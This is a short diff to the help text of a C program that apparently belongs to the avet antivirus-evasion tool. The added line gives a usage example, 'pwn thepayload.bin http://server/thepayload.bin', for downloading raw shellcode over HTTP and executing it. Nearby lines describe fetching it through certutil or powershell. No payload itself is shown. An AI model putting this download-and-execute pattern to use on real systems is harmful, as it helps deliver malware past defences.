@@ -264,6 +264,7 @@ void print_help()
 	printf("   -d powershell -> use powershell for downloading the file\n");
 	printf("      usage of -d certutil/powershell in combination with -f\n");
 	printf("      for executing the raw shellcode after downloading\n");
+	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
 	printf("   Can be used with -l\n");
 	//printf("-A use metasploits ASCII encryption, usage is like -E\n");
